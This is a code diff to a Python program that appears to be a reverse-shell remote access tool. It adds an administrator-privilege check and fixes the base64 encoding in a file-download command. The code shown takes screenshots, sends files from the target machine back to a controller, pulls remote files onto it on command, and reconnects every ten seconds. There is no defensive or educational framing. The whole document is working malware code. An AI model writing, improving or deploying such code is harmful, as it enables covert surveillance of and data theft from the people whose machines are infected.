@@ -36,6 +36,16 @@ def screenshot():
     with mss() as screenshot:
         screenshot.shot()
 
+def check_privs(): #check if user is admin by accessing an admin folder
+    global admin
+    try:
+        tmp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows')]))
+    except:
+        admin = "User Privileges"
+    else:
+        admin = "Administrator Privileges"
+
+
 def connect():
     while True:
         time.sleep(10) #reconnect every 10 seconds
@@ -59,14 +69,6 @@ def shell():
             except:
                 continue
 
-        elif cmd[:4] == "wget":
-            url = cmd[5:]
-            try:
-                web_download(url)
-                send_j("File Downloaded successfully!")
-            except:
-                send_j("Failed to download")
-
         elif cmd[:10] == "screenshot":
             try:
                 screenshot() #take screenshot and its always saved as monitor-1.png
@@ -77,10 +79,24 @@ def shell():
             except:
                 send_j("failed to take screenshot")
 
+        elif cmd[:5] == "check":
+            check_privs()
+            send_j(admin)
+
+        elif cmd[:4] == "wget":
+            url = cmd[5:]
+            try:
+                web_download(url)
+                send_j("File Downloaded successfully!")
+            except:
+                send_j("Failed to download")
+
+
+
         elif cmd[:8] == "download":
             try:
                 with open(cmd[9:], "rb") as f:
-                    send_j(base64.b64encode(f.read().encode('utf-8')).decode('utf-8'))
+                    send_j(base64.b64encode(f.read()).decode('utf-8'))
                     f.close()
             except:
                 error = "File not found"
